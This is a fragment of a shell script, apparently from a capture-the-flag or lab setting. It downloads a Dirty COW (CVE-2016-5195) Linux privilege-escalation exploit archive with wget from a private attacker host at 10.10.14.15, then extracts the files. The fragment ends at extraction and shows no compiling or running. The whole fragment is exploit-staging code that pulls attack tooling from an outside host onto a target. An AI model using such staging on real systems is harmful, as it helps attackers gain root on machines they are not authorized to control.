...
workspacezip="CVE-2016-5195-master.zip";
workspace="CVE-2016-5195-master";
rm -f $workspacezip > /dev/null; # Remove zip if it exists
rm -rf $workspace > /dev/null; # Remove workspace if it exists
wget -O CVE-2016-5195-master.zip http://10.10.14.15/CVE-2016-5195-master.zip > /dev/null 2>&1;
if [ -f $workspacezip ];
then
    echo "[INFO] Extracting exploit files...";
    unzip $workspacezip > /dev/null;
